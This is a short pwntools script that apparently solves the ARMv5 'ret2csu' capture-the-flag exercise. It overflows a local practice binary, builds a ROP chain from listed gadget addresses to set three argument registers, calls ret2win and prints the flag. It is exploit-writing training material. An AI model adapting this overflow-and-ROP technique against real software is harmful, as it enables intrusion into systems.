from pwn import *

BINARY = "./ret2csu_armv5-hf"
ELF = ELF(BINARY)

context.os = "linux"
context.arch = "arm"
context.binary = BINARY

p = process(BINARY)

pop_r3_pc             = p32(0x10480) # pop {r3, pc}
mov_r0_r3_pop_fp_pc   = p32(0x105c8) # mov r0, r3 ; pop {fp, pc}
pop_r1245678_ip_lr_pc = p32(0x10620) # pop {r1, r2, r4, r5, r6, r7, r8, ip, lr, pc}
bl_ret2win            = p32(0x105e4) # bl ret2win --> works too with 0x104a4 <ret2win@plt>

rop = b"A" * 36

rop += pop_r3_pc

rop += p32(0xdeadbeef)

rop += mov_r0_r3_pop_fp_pc
rop += b'BBBB'

rop += pop_r1245678_ip_lr_pc
rop += p32(0xcafebabe) # r1
rop += p32(0xd00df00d) # r2
rop += b'CCCC' # r4
rop += b'CCCC' # r5
rop += b'CCCC' # r6
rop += b'CCCC' # r7
rop += b'CCCC' # r8
rop += b'CCCC' # ip
rop += b'CCCC' # lr
rop += bl_ret2win # pc

p.sendline(rop)
log.success(f"ROPchain = {rop}")

flag = p.recvall().split(b'\n')[-2]
log.success(f"FLAG : {flag}")
